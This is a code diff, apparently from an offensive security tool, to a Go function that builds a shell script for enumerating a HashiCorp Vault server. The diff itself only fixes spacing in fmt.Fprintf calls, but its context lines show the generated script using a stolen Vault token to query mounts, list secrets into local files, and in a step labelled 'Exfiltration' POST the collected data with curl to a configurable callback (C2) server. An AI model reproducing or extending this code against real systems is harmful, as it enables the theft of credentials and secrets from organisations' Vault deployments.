@@ -76,7 +76,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
   _vaddr="${VAULT_ADDR:-}"
 `)
 	if vaultAddr != "" {
-		fmt.Fprintf(&b,`  [ -z "$_vaddr" ] && _vaddr="%s"
+		fmt.Fprintf(&b, `  [ -z "$_vaddr" ] && _vaddr="%s"
 `, vaultAddr)
 	}
 	b.WriteString(`  if [ -z "$_vaddr" ]; then
@@ -137,7 +137,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 `)
 
 	// Step 3: Enumerate sys/mounts
-	fmt.Fprintf(&b,`  # 3. Enumerate Vault mounts
+	fmt.Fprintf(&b, `  # 3. Enumerate Vault mounts
   echo "[*] Querying sys/mounts..."
   curl -sS -H "X-Vault-Token: $_vtok" \
     "${_vaddr}/v1/sys/mounts" > "$_d/mounts.json" 2>/dev/null || true
@@ -156,7 +156,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 		// Remove trailing slash for consistency
 		m = strings.TrimRight(m, "/")
 
-		fmt.Fprintf(&b,`  echo "[*] Listing secrets in mount: %s"
+		fmt.Fprintf(&b, `  echo "[*] Listing secrets in mount: %s"
   mkdir -p "$_d/secrets/%s"
   _keys=$(curl -sS -H "X-Vault-Token: $_vtok" \
     --request LIST \
@@ -186,7 +186,7 @@ func buildVaultEnumScript(o VaultEnumOptions) string {
 	// Step 6: Exfiltration
 	c2 := strings.TrimSpace(o.CallbackURL)
 	if c2 != "" {
-		fmt.Fprintf(&b,`  # 6. Exfiltrate to callback server
+		fmt.Fprintf(&b, `  # 6. Exfiltrate to callback server
   echo "[*] Exfiltrating to: %s"
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
